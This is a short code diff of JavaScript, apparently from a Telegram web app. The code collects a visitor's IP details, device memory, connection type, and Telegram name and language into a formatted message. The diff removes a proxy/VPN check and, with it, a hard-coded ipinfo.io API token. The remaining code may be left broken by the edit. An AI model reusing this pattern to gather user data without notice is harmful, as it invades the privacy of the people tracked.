@@ -100,12 +100,6 @@ fetch('https://ipapi.co/json/')
     let memory = navigator.deviceMemory;
   
     let TypeInternet = navigator.connection.effectiveType;
-        
-fetch(`https://ipinfo.io/${ip}/json?token=afae6637fcf7bf`)
-    .then(response => response.json())
-    .then(data => {
-        let isProxy = data.threat.proxy ? true : false;
-        let isVPN = data.threat.is_tor ? true : false;
 
         const message = `
       * Ip 🌐*
@@ -133,7 +127,6 @@ fetch(`https://ipinfo.io/${ip}/json?token=afae6637fcf7bf`)
     *├ Name: ${tg.initDataUnsafe.user.first_name}*
     *├ Language: ${tg.initDataUnsafe.user.language_code}*
                              `;
-    })
     .catch(error => {
         console.error('Error:', error);
     });
